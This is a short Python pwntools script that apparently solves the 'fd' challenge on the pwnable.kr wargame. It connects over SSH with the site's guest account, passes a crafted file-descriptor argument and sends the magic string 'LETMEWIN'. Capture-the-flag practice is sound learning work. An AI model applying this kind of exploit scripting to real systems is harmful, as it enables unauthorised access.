#!/usr/bin/python3
from pwn import *

s = ssh('fd', 'pwnable.kr', 2222, 'guest')
p = s.process(['./fd', str(0x1234)])
p.sendline('LETMEWIN')

print(p.recvall().decode('ascii'))